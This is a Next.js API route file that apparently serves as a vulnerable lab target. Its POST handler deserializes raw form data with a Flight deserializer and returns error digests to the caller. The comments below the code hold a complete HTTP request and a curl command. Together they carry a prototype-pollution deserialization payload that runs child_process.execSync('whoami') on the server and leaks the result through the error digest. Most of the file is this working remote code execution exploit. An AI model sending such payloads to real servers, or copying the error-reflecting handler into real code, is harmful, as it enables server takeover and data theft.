import { deserializeFlight } from "@/lib/flight";
import { NextResponse } from "next/server";

export async function GET() {
  return NextResponse.json({
    rabbit: "gotcha!",
  });
}

export async function POST(req: Request) {
  const form = await req.formData();

  try {
    deserializeFlight(form);
    return new Response("OK");
  } catch (err: any) {
    if (err.digest) {
      return new Response(err.digest, { status: 500 });
    }
    return new Response(err.message, { status: 500 });
  }
}

// pelod :
// POST /api/secret HTTP/1.1
// Host: localhost:3000
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
// Next-Action: x
// X-Nextjs-Request-Id: b5dce965
// Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
// X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
// Content-Length: 744
// ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
// Content-Disposition: form-data; name="0"
// {
//   "then": "$1:__proto__:then",
//   "status": "resolved_model",
//   "reason": -1,
//   "value": "{\"then\":\"$B1337\"}",
//   "_response": {
//     "_prefix": "var res=process.mainModule.require('child_process').execSync('whoami',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
//     "_chunks": "$Q2",
//     "_formData": {
//       "get": "$1:constructor:constructor"
//     }
//   }
// }
// ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
// Content-Disposition: form-data; name="1"
// "$@0"
// ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
// Content-Disposition: form-data; name="2"
// []
// ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

// curl nya :
// curl --path-as-is -i -s -k -X $'POST' \
//     -H $'Host: localhost:3000' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0' -H $'Next-Action: x' -H $'X-Nextjs-Request-Id: b5dce965' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' -H $'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' -H $'Content-Length: 744' \
//     --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\x0d\x0aContent-Disposition: form-data; name=\"0\"\x0d\x0a\x0d\x0a{\x0d\x0a  \"then\": \"$1:__proto__:then\",\x0d\x0a  \"status\": \"resolved_model\",\x0d\x0a  \"reason\": -1,\x0d\x0a  \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",\x0d\x0a  \"_response\": {\x0d\x0a    \"_prefix\": \"var res=process.mainModule.require(\'child_process\').execSync(\'whoami\',{\'timeout\':5000}).toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'), {digest:`${res}`});\",\x0d\x0a    \"_chunks\": \"$Q2\",\x0d\x0a    \"_formData\": {\x0d\x0a      \"get\": \"$1:constructor:constructor\"\x0d\x0a    }\x0d\x0a  }\x0d\x0a}\x0d\x0a------WebKitFormBoundaryx8jO2oVc6SWP3Sad\x0d\x0aContent-Disposition: form-data; name=\"1\"\x0d\x0a\x0d\x0a\"$@0\"\x0d\x0a------WebKitFormBoundaryx8jO2oVc6SWP3Sad\x0d\x0aContent-Disposition: form-data; name=\"2\"\x0d\x0a\x0d\x0a[]\x0d\x0a------WebKitFormBoundaryx8jO2oVc6SWP3Sad--' \
//     $'http://127.0.0.1:3000/api/secret'
